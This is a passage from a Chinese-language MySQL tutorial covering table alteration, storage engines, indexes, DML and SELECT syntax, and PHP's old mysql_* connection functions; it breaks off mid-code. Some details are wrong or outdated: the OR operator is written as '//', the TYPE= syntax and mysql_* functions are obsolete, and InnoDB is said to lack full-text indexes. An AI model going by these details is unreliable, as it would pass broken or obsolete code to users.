<li>为指定的数据表为了更改原有字段的类型，可使用CHANGE或MODIFY子句。如果原列的名字和新列的名字相同，则change或Modify的作用相同。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 CHANGE(MODIFY) 列表 &lt;建表语句&gt;		#为指定的表修改列类型</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>CHANGE除了更改类型外还能更改列名，而MODIFY不能实现这个功能。</p>
<ul>
<li>如果需要为指定的数据表重新命名，可使用RENAME AS子句，给出旧表名和新表名即可。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 旧表名 RENAME AS 新表名			#为 指定的数据表重新命名</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4><span id="删除表drop-table">删除表（DROP TABLE）</span></h4><p>可以使用SQL的DROP TABLE语句删除。删除表要比创建和修改表要容易得多，只需要指定表名即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE[IF EXISTS] 表名</span><br></pre></td></tr></table></figure></p>
<p>当不能确定数据表是否存在，如果存在就删除它，如果存在就删除它，不存在则删除时也不行出现错误，就可在DROPTABLE语句中增加IF EXISTS。同CREATE TABLE一样，IF EXISTS语句在含有DROP TABLE的SQL脚本中很常用，如果不存在待删除的表，脚本会继续向下执行而不会跑出错误。</p>
<h3><span id="数据表的类型及存储位置">数据表的类型及存储位置</span></h3><p>MySQL支持MyISAM、InnoDB、HEAP、BOB、ARCHIVE、CSV等多种数据表类型，在创建一个新MySQL数据库表时，可以为它设置一个类型。</p>
<h4><span id="myisam数据表">MyISAM数据表</span></h4><p>MyISAM数据表类型的特点是成熟、稳定和易于管理。</p>
<h4><span id="innodb数据表">InnoDB数据表</span></h4><p>InnoDB给MySQL提供了具有提交，回滚和崩溃恢复能力的事务安全存储引擎。</p>
<h4><span id="myisam和innodb两个表的功能简单对比">MyISAM和InnoDB两个表的功能简单对比</span></h4><table>
<thead>
<tr>
<th>表类型功能对比</th>
<th style="text-align:left">MyISAM表</th>
<th>InnoDB</th>
</tr>
</thead>
<tbody>
<tr>
<td>事务处理</td>
<td style="text-align:left">不支持</td>
<td>支持</td>
</tr>
<tr>
<td>数据行锁定</td>
<td style="text-align:left">不支持，只有表锁定</td>
<td>支持</td>
</tr>
<tr>
<td>外键约束</td>
<td style="text-align:left">不支持</td>
<td>支持</td>
</tr>
<tr>
<td>表空间大小</td>
<td style="text-align:left">相对小</td>
<td>相对大，最大是2倍</td>
</tr>
<tr>
<td>全文索引</td>
<td style="text-align:left">支持</td>
<td>不支持</td>
</tr>
<tr>
<td>COUNT问题</td>
<td style="text-align:left">无</td>
<td>执行COUNT(*)查询，速度慢</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE t(i INT) ENGINE = INNODB;				#新建表t时指定表类型为INNODB</span><br><span class="line">CREATE TABLE t(i INT) TYPE = MYISAM;				#新建表t时指定表类型为MYISAM</span><br></pre></td></tr></table></figure>
<h3><span id="数据表的默认字符集">数据表的默认字符集</span></h3><p>使用CREATE TABLE命令创建数据表时，如果没有明确地指定任何字符集，则新创建数据库的字符集将由MySQL配置文件里character-set-server选项的设置决定。在MySQL配置文件（Linux系统为/etc/my.cnf文件，Windows系统则是my.ini文件）里设置数据表的字符集。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">character-set-server = gbk		#设置MySQL服务器的字符集</span><br><span class="line">collation-server	= gbk_chinese_ci		#设置排序方法</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS mydb DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</span><br><span class="line">#为新创建的数据库mydb设置默认的字符集</span><br></pre></td></tr></table></figure>
<h3><span id="创建索引">创建索引</span></h3><p>在MySQL中主要有四类索引：主键索引（PRIMARY KEY）、唯一索引（UNIQUE）、常规索引（INDEX）和全文索引（FULLTEXT）。</p>
<h4><span id="主键索引primary-key">主键索引（PRIMARY KEY）</span></h4><p>主键索引是关系数据库中最常见的索引类型，主要作用是确定数据表里一条特定的数据记录的位置。数据表会根据主键的唯一性来唯一标识每条记录，使用任意两条记录里的主键字段不允许是同样的内容，这样可以加快寻址定位时的速度。最好为每张数据表指定一个主键，但一个表只能指定一个主键，而且主键的值不能为空，不过可以有多个候选索引。</p>
<h4><span id="唯一索引unique">唯一索引（UNIQUE）</span></h4><p>唯一索引与主键索引一样，都可以防止创建重复的值。但是，不同之处在于，每个数据表中只能有一个主键索引，但可以有多个唯一索引。如果能确定某个数据列将只包含彼此各不相同的值，在为这个数据列创建索引的时候就应该使用关键字UNIQUE把它定义为一个唯一索引。</p>
<h4><span id="常规索引index">常规索引（INDEX）</span></h4><p>创建常规索引可以使用关键字KEY或INDEX随表一同创建，KEY通常是INDEX同义词。也可以在创建表之后CREATE INDEX或ALTER TABLE命令来创建。<br>如果在创建表时没有创建索引，就需要使用CREATE INDEX命令来创建同样的常规索引。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE INDEX ind ON carts(userId,bookId）;			#创建名称为ind的索引为carts表的两个列</span><br></pre></td></tr></table></figure></p>
<h4><span id="全文索引fulltext">全文索引（FULLTEXT）</span></h4><p>全文索引在MySQL中是一个FULLTEXT类型索引，但FULLTEXT索引只能用于MyISAM表，并且只可以在CHAR、VARCHAR或TEXT类型的列上创建，也允许创建在一个或多个数据列上。</p>
<h2><span id="sql语言设计">SQL语言设计</span></h2><h3><span id="使用dml命令操作数据表中的数据记录">使用DML命令操作数据表中的数据记录</span></h3><p>为了修改数据库中的数据，SQL的数据操纵语言（DML）提供了增（INSERT）、删（DELETE）、改（UPDATE）语句。</p>
<h4><span id="使用insert语句想数据表中添加数据">使用INSERT语句想数据表中添加数据</span></h4><p>插入数据是向已经存在的数据表中添加一条新的记录，应该使用INSERT INTO语句。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO 表名 [(字段名1,字段名2,...,字段名n] VALUES(&apos;值1&apos;,&apos;值2&apos;,...,&apos;值n&apos;);</span><br></pre></td></tr></table></figure></p>
<p>在表名后面的括号中是该表中定义的字段名称列表，它们与VALUES子句后面的表达式列表的值是一一对应的，个数也要相等，并且表达式值的类型必须与字段的类型一致。需要用逗号将各个数据分开，字符型数据要用单引号括起来。INSERT语句也可以省略字段列表，但必须插入一行完整的数据，而且必须按表中定义的字段顺序为全部字段提供值。</p>
<h4><span id="使用update语句更新数据表中已存在的数据">使用UPDATE语句更新数据表中已存在的数据</span></h4><p>SQL语句可以使用UPDATE语句对表中的一列或多列数据进行修改，必须指定需要修改的字段，以及需要赋予的新值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE 表名				#需要给出被修改的表格</span><br><span class="line">SET 字段名=表达式[, .....]			#可以对表中一列或多列数据进行修改</span><br><span class="line">[WHERE 条件];					#给出必要的WHERE子名指定要更新的数据行</span><br></pre></td></tr></table></figure></p>
<p>其中的WHERE子句是必需的，如果不使用WHERE检索条件，则UPDATE语句会将数据表中全部数据行都修改。</p>
<h4><span id="使用delete语句删除数据表中不需要的数据记录">使用DELETE语句删除数据表中不需要的数据记录</span></h4><p>使用DELETE语句用来删除数据表中的一条或多条数据记录。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM 表名 [WHERE 条件];			#删除表中记录行的DELETE语法格式</span><br></pre></td></tr></table></figure></p>
<p>如果没有指定WHERE子句的检索条件，DELETE语句将会删除数据表中的全部数据记录，使用数据库中只剩下数据表结构。</p>
<h3><span id="通过dql命令查询数据表中的数据">通过DQL命令查询数据表中的数据</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT [ALL|DISTINCT]				#使用SELECT语句查询检索</span><br><span class="line">&#123;*|table.*|[table.]field1[AS alias1][,[table.]field2[AS alias2][,...]]&#125;				#选择哪些数据列</span><br><span class="line">FROM tableexpression[,...][IN externaldatabase]				#指定SELECT语句中字段的来源</span><br><span class="line">[WHERE...]			#数据行必须满足哪些检索条件</span><br><span class="line">[GROUP BY...]			#指明按照哪几字段来分组</span><br><span class="line">[HAVING...]			#过滤分组的记录，必须满足的次要条件</span><br><span class="line">[ORDER BY...]			#按一个或多个字段排序查询结果</span><br><span class="line">[LIMIT count];			#对结构个数限制</span><br></pre></td></tr></table></figure>
<p>用中括号“[]”括起来的部分表示是可选的，用大括号“{}”括起来的部分是标识必须从中选择其中的一个。FROM子句指定了SELECT语句中字段的来源，FROM子句后面是包含一个或多个的表达式（由逗号分开），其中的表达式可为单一表名称、已保存的查询或由INNER JOIN、LEFT JOIN或RIGHT JOIN得到的复合结果。</p>
<h4><span id="选择特定的字段">选择特定的字段</span></h4><p>使用SELECT语句检索记录的特定字段，多个字段可以用逗号分隔。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field1,field2 FROM table1;</span><br></pre></td></tr></table></figure></p>
<p>可以使用“<em>”从表中检索出所有字段，使用“SELECT</em>”主要是针对用户的书写方便而言。对于不同的数据表，这个操作可将表中每一行、列的数据全部检索出来。</p>
<h4><span id="使用as子句为字段取别名">使用AS子句为字段取别名</span></h4><p>如果想为返回的列取一个新的标题，以及经过对字段的计算或总结之后，产生了一个新的值，希望把它放到一个新的列里显示，则用AS保留。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT Name as &apos;名称&apos;,author as &apos;作者&apos;,price as &apos;价格&apos;FROM tables;</span><br></pre></td></tr></table></figure></p>
<p>定义别名时一定要使用单引号引起来。其中AS关键字是可选的，在原字段名和别名之间使用一个空格即可。<br>在有多个表关联查询的情况下，如果表中有同名的字段时，则必须使用别名加以区分。</p>
<h4><span id="distinct关键字的使用">DISTINCT关键字的使用</span></h4><p>在使用SELECT语句返回的记录结构中包含重复的记录，可以使用DISTINCT关键字取消重复的数据，只返回一个。DISTINCT关键字的作用范围是整个查询的列表，而不是单独的一列。同时对两列数据进行查询时，使用了DISTINCT关键字，将返回这两列数据的唯一组合。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT idFROM table;			#取消id列中重复的数据。</span><br></pre></td></tr></table></figure></p>
<p>使用DISTINCT关键字可以返回简单、明了的数据，但服务器必须话费更多的时间去执行对查询结果的分类和整理。与DISTINCT相对应的是ALL关键字，用于返回满足SELECT语句条件的所有记录。</p>
<h4><span id="在select语句中使用表达式的列">在SELECT语句中使用表达式的列</span></h4><p>在SQL语句中，表达式可用于一些诸如SELECT语句的ORDER BY或HAVING子句、SELECT、DELETE或UPDATE语句的WHERE子句或SET语句之类的地方。使用文本值、column值、NULL值、函数、操作符来书写表达式。主要包括算术表达式、逻辑表达式，以及使用SQL函数表达式。<br>在SELECT语句中使用表达式重新对数据列进行计算。</p>
<h4><span id="使用where子句按条件检索">使用WHERE子句按条件检索</span></h4><p>在SELECT语句中，可以使用WHERE子句指定搜索条件，实现从数据表中检索出符合条件的记录。其中，搜索条件可以由一个或多个逻辑表达式组成，这些表达式指定关于某一记录是真或假的条件。在WHERE子句中，可以通过逻辑操作符和比较操作符和比较操作符指定基本的表达式条件。</p>
<h5><span id="逻辑操作符">逻辑操作符</span></h5><table>
<thead>
<tr>
<th>操作符</th>
<th style="text-align:left">语法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>AND或&amp;&amp;</td>
<td style="text-align:left">a AND b或a &amp;&amp; b</td>
<td>逻辑与</td>
</tr>
<tr>
<td>OR或//</td>
<td style="text-align:left">a OR b或a // b</td>
<td>逻辑或</td>
</tr>
<tr>
<td>XOR</td>
<td style="text-align:left">a XOR b</td>
<td>逻辑异或</td>
</tr>
<tr>
<td>NOT或！</td>
<td style="text-align:left">NOT a或！a</td>
<td>逻辑非</td>
</tr>
</tbody>
</table>
<h5><span id="比较操作符">比较操作符</span></h5><table>
<thead>
<tr>
<th>操作符</th>
<th style="text-align:left">语法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>IS NULL</td>
<td style="text-align:left">a IS NULL</td>
<td>若操作数a为NULL，则为真</td>
</tr>
<tr>
<td>IS NOT NULL</td>
<td style="text-align:left">a IS NOT NULL</td>
<td>若操作数a不为NULL，则为真</td>
</tr>
<tr>
<td>BETWEEN</td>
<td style="text-align:left">a BETWEEN b AND c</td>
<td>若a在b和c之间（包括b和c），则为真</td>
</tr>
<tr>
<td>NOT BETWEEN</td>
<td style="text-align:left">a NOT BETWEEN b AND c</td>
<td>若a不在b和c之间（包括b和c），则为真</td>
</tr>
<tr>
<td>LIKE</td>
<td style="text-align:left">a LIKE b</td>
<td>SQL模式匹配，若a匹配b，则为真</td>
</tr>
<tr>
<td>NOT LIKE</td>
<td style="text-align:left">a NOT LIKE b</td>
<td>SQL模式匹配，若a不匹配b，则为真</td>
</tr>
<tr>
<td>IN</td>
<td style="text-align:left">a IN(b1,b2,b3,…)</td>
<td>若a等于b1,b2,b3,…中的某一个，则为真</td>
</tr>
</tbody>
</table>
<h4><span id="根据空值null确定检索条件">根据空值（NULL）确定检索条件</span></h4><p>空值只能定义在允许NULL字段中出现，NULL值是特殊的值，代表“无值”，与0和空字符串（”）都不相同。当在不支持默认值的字段中未输入值，或在字段中显式的设置为空，就会出现空值，但不能用处理已知值的方式来出来NULL。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM books WHERE detail IS NOT NULL;		#查找不为空的数据</span><br></pre></td></tr></table></figure></p>
<h4><span id="使用between-and进行范围比较查询">使用BETWEEN AND进行范围比较查询</span></h4><p>需要对某个字段通过范围的值进行比较查询，可以使用BETWEEN AND关键字实现，其中AND是多重条件符号，比较时也包括边界条件。也可以使用”&gt;=”和”=&lt;”完成相同的功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT name,price FROM books WHERE price BETWEEN 30 AND 80;</span><br><span class="line">SELECT name,price FROM books WHERE price &gt;= 30 AND price &lt;=80;</span><br></pre></td></tr></table></figure></p>
<h4><span id="使用in进行范围比较查询">使用IN进行范围比较查询</span></h4><p>在WHERE子句中，使用IN关键字并在后面的括号”（）”中提供一个值的列表，以供与相应的字段进行比较。该列表中至少应该存在一个值，如果有多个值可以使用逗号”，”分隔。</p>
<h4><span id="使用like进行模糊查询">使用LIKE进行模糊查询</span></h4><p>在SELECT语句的WHERE子句中，可以使用LIKE关键字对数据表中的记录进行模糊查询，将查询结果锁定在一个范围内。在查询条件中通常会与”_”和”%”两个通配符一起使用，可以实现复制的检索查询。</p>
<ul>
<li>百分号”%”：表示0个或任意多个字符。</li>
<li>下划线”_”：表示单个的任意一个字符。</li>
</ul>
<h4><span id="多表查询连接查询">多表查询（连接查询）</span></h4><ul>
<li>非等值和等值的多表查询<br>多表查询和普通的单表查询相似，都是使用SELECT语句。只不过在多表查询时需要把多张表的名字，全部填写在FROM子句中，并用逗号”，”将表名分开。同时，也可以对数据表使用别名进行引用。为了在查询时区分多个表中出现的重复字段名，可以在字段列表中使用”表名.列名”的形式，如果不存在重名的列，可以省略表名。</li>
<li>自身连接查询<br>连接查询操作不仅可以用于多个表之间，也可以是一个表与其自己进行拼接，称为自身连接查询。当一个表所代表的实体之间有关系时，就可以使用自身连接查询。</li>
<li>复合连接查询<br>在FROM子句后面有n个表需要查询，则在WHERE子句中就需要有多个连接条件。至少要比出现的表格数量少一个，也就是不能少于n-1个查询条件，多个条件使用”AND”关键词连接即可。</li>
</ul>
<h4><span id="嵌套查询子查询">嵌套查询（子查询）</span></h4><p>嵌套查询是在一个SELECT语句的WHERE子句中，包含另一个SELECT语句，也可以称为子查询。在子查询中只能返回一列，并将形成的结果又作为父查询的条件，在主句中进行一布查询。SQL允许多层嵌套查询，嵌套查询的求解方法是由里向外处理，即每个子查询都是在上一级查询处理之前求解，子查询的结果用于建立其父查询的查找条件。</p>
<h4><span id="使用order-by对查询结果排序">使用ORDER BY对查询结果排序</span></h4><p>在SELECT语句中使用ORDER BY子句，对检索的结果进行排序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id,name FROM books ORDER BY id DESC;</span><br></pre></td></tr></table></figure></p>
<p>ORDER BY后面可以接一列或多列用于排序的字段，并且使用DESC或ASC关键字设计字段排序的方式。默认情况下按照升序排列，即使用ASC关键字。否则要按照降序排列，必须使用DESC关键字。ORDER BY子句可以和SELECT语句中的其他子句一起使用，但在子查询中不能哟ORDER BY子句，因为ORDER BY子句只能对最终查询结果排序。</p>
<h4><span id="使用limit限定结构行数">使用LIMIT限定结构行数</span></h4><p>LIMIT子句可以和其他的SELECT子句一起使用，它可以指定两个参数，分别用以设置返回记录的起始位置，和返回记录的数量。</p>
<h4><span id="使用统计函数">使用统计函数</span></h4><table>
<thead>
<tr>
<th>统计函数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>COUNT()</td>
<td style="text-align:left">返回满足SELECT语句中指定条件的记录数，例如，COUNT（*）返回找到的记录行数</td>
</tr>
<tr>
<td>SUM()</td>
<td style="text-align:left">通常为数值字段或表达列作统计，返回一列的总和</td>
</tr>
<tr>
<td>AVG()</td>
<td style="text-align:left">通常为数值字段或表达列作统计，返回一列的平均值</td>
</tr>
<tr>
<td>MAX()</td>
<td style="text-align:left">可以为数值字段、字符字段或表达列作统计，返回一列中最大的值</td>
</tr>
<tr>
<td>MIN()</td>
<td style="text-align:left">可以为数值字段、字符字段或表达列统计，返回一列中最小的值</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 函数名 （列名1或*）, ...函数名 （列名n） FROM 表名;		#使用统计函数</span><br></pre></td></tr></table></figure>
<h4><span id="使用group-by对查询结构分组">使用GROUP BY对查询结构分组</span></h4><p>GROUP BY子句将表按列值分组，列的值相同的分为一组。如果GROUP BY后面有多个列名，则先按第一个列名分组，再在每组中按第二个列名分组。</p>
<h2><span id="使用php脚本向mysql服务器发送sql">使用PHP脚本向MySQL服务器发送SQL</span></h2><h3><span id="在php脚本中连接mysql服务器">在PHP脚本中连接MySQL服务器</span></h3><p>PHP可以通过MySQL功能模块去连接MySQL服务器，办法是调用mysql_connect()函数，和使用MySQL客户机程序连接MySQL服务器类似。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resource mysql_connect([string server[,string username[,string password[,bool new_link[,int client_flags]]]]])</span><br></pre></td></tr></table></figure></p>
<p>通常只要提供前三个参数即可，包括MySQL服务器的主机名、MySQL用户名和密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;mysql_pass&quot;);			//使用PHP程序连接MySQL服务器</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $link=mysql_connect(&quot;localhost&quot;, &quot;mysql_user&quot;, &quot;mysql_password&quot;) or die(&quot;连接失败: &quot;.mysql_error());</span><br><span class="line">    echo &quot;与MySQL服务器建立的连接成功:&lt;br&gt;&quot;;          //连接成功则会输出这条提示信息</span><br><span class="line">    echo mysql_get_client_info();                          //客户端API函数库的版本信息</span><br><span class="line">    echo mysql_get_host_info();                           //与MySQL服务器的连接类型</span><br><span class="line">    echo mysql_get_proto_info();                          //通信协议的版本信息</span><br><span class="line">    echo mysql_get_server_info();                         //MySQL服务器的版本信息</span><br><span class="line">    echo mysql_client_encoding();                         //客户端使用的默认字符集</span><br><span class="line">    echo mysql_stat();                                   //MySQL服务器的当前工作状态</span><br><span class="line">    mysql_close($link);                                  //关闭与MySQL服务器建立的连接</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="在php程序中选择已创建的数据库">在PHP程序中选择已创建的数据库</span></h3><p>为了避免每次调用PHP的mysql扩展函数时都指定目录数据库，最好先用mysql_select_db()函数为后续操作选定一个默认数据库，这个函数和SQL命令“USE bookstore”功能相似。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$link=mysql_connect(&quot;localhost&quot;, &quot;mysql_user&quot;, &quot;mysql_password&quot;) or die(&quot;连接失败: &quot;.mysql_error());</span><br><span class="line">	mysql_select_db(&apos;bookstore&apos;,$link)or die(&apos;不能选定数据库：&apos;.mysql_error());</span><br><span class="line">	mysql_close($link);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="执行sql命令">执行SQL命令</span></h3><p>在PHP脚本中，只要把SQL命令作为一个字符串传递给mysql_query函数，就会将其发送到MySQL服务器中并执行。如果想访问的不是当前数据库，就需要调用mysql_db_query()函数来执行SQL命令并明确地给出数据库的名字。这两个函数的最后一个参数都是可选的，即mysql_connect()函数返回的连接标识号，只要在与同一个MySQL服务器建立多条连接的时候才必须给出这个参数。<br>mysql_query()函数可以用来执行DDL、DML、DQL及DCL等任何一种SQL命令，如果想执行一条以上的SQL命令，就需要为它们分别调用一次mysql_query()函数。如果SQL命令执行成功，mysql_query()函数将返回一个非0值。如果没有执行不成功，该函数将返回FALSE（即数值0），并会生成一条出错信息，出错原因可以利用mysql_errno()和mysql_error()函数来确定。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $link=mysql_connect(&quot;localhost&quot;, &quot;mysql_user&quot;, &quot;mysql_pass&quot;) or die(&quot;连接失败: &quot;.mysql_error());</span><br><span class="line">    //为后续的mysql扩展函数的操作选定一个默认的数据库，它相当于SQL命令use bookstore</span><br><span class="line">    mysql_select_db(&apos;bookstore&apos;) or die (&apos;不能选定数据库 bookstore : &apos; . mysql_error());</span><br><span class="line">   </span><br><span class="line">    //将插入3条的INSERT语句声明为一个字符串 </span><br><span class="line">    $insert=&quot;INSERT INTO books(bookName, publisher, author, price, detail) VALUES</span><br><span class="line">	    (&apos;PHP&apos;, &apos;电子工业&apos;, &apos;高某某&apos;, &apos;80.00&apos;, &apos;与PHP相关的图书&apos;),</span><br><span class="line">	    (&apos;JSP&apos;, &apos;人民邮电&apos;, &apos;洛某某&apos;, &apos;50.00&apos;, &apos;与JSP相关的图书&apos;),</span><br><span class="line">	    (&apos;ASP&apos;, &apos;电子工业&apos;, &apos;峰某某&apos;, &apos;30.00&apos;, &apos;与ASP相关的图书&apos;)&quot;;</span><br><span class="line"></span><br><span class="line">    //使用mysql_query()函数发送INSERT语句，如果成功返回TRUE，失败则返回FALSE</span><br><span class="line">    $result=mysql_query($insert);          </span><br><span class="line">    if($result &amp;&amp; mysql_affected_rows()&gt;0)&#123;</span><br><span class="line">	    echo &quot;数据记录插入成功，最后一条插入的数据记录ID为：&quot;.mysql_insert_id().&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">	    echo &quot;插入记录失败，错误号：&quot;.mysql_errno().&quot;，错误原因：&quot;.mysql_error().&quot;&lt;br&gt;&quot;;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    //执行UPDATE命令修改表books中的一条记录，将图书名为PHP的记录价格修改为79.90</span><br><span class="line">    $result1=mysql_query(&quot;UPDATE books SET price=&apos;79.9&apos; WHERE bookName=&apos;PHP&apos;&quot;);</span><br><span class="line">    if($result1 &amp;&amp; mysql_affected_rows()&gt;0)&#123;</span><br><span class="line">	    echo &quot;数据记录修改成功&lt;br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">	    echo &quot;修改数据失败，错误号：&quot;.mysql_errno().&quot;，错误原因：&quot;.mysql_error().&quot;&lt;br&gt;&quot;;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    //执行DELETE命令删除表books中图书名为JSP的记录</span><br><span class="line">    $result2=mysql_query(&quot;DELETE FROM books WHERE bookName=&apos;JSP&apos;&quot;);</span><br><span class="line">    if($result2 &amp;&amp; mysql_affected_rows()&gt;0)&#123;</span><br><span class="line">	    echo &quot;数据记录删除成功&lt;br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">	    echo &quot;删除数据失败，错误号：&quot;.mysql_errno().&quot;，错误原因：&quot;.mysql_error().&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close($link);                               //关闭与MySQL服务器建立的连接</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="在php脚本中处理select查询结果集">在PHP脚本中处理SELECT查询结果集</span></h3><p>在PHP脚本中执行SELECT查询命令，也是调用mysql_query()函数，但和执行DML不同的是，执行SELECT命令之后mysql_query()函数的返回值是一个PHP资源的引用指针（结果集）。这个返回值可以用在各种结果集处理函数中，对结果数据包的各个字段进行处理。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$result=mysql_query(&quot;SELECT * FROM books&quot;);			//执行SELECT语句返回结果集资源$result</span><br><span class="line">$rows=mysql_num_rows($result);			//从结果几种获得数据记录行的个数</span><br><span class="line">$cols=mysql_num_fields($result);		//从结果中获得数据记录列的个数</span><br></pre></td></tr></table></figure></p>
<ul>
<li>mysql_fetch_row():该函数将一条结构记录返回并以一个普通索引数组的形式保存。</li>
<li>mysql_fetch_assoc():该函数将一条结果记录返回并以一个普通关联数组的形式保存。</li>
<li>mysql_fetch_array():该函数可以将结果数据表中的每一行获取为一个关联数组或索引数组，或者同时获取为关联和索引数组。可以通过为该函数传递MYSQL_ASSOC、MYSQL_NUM或MYSQL_BOTH中的一个常量返回不同的数组形态，默认使用MYSQL_BOTH常量将两种数组一起返回。</li>
<li>mysql_fetch_object():该函数将以一个对象的形式返回一条结果记录，它的各个字段需要以对象的方式进行访问。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $link=mysql_connect(&quot;localhost&quot;, &quot;mysql_user&quot;, &quot;mysql_pass&quot;) or die(&quot;连接失败: &quot;.mysql_error());</span><br><span class="line">    mysql_select_db(&apos;bookstore&apos;) or die (&apos;不能选定数据库 bookstore : &apos; . mysql_error());</span><br><span class="line">   </span><br><span class="line">    //执行DQL命令返回结果集$result</span><br><span class="line">    $result=mysql_query(&quot;select bookId, bookName, author, publisher,price,detail from books&quot;);           </span><br><span class="line">    echo &apos;&lt;table align=&quot;center&quot; width=&quot;80%&quot; border=&quot;1&quot;&gt;&apos;;   //以HTML表格输出结果</span><br><span class="line">    echo 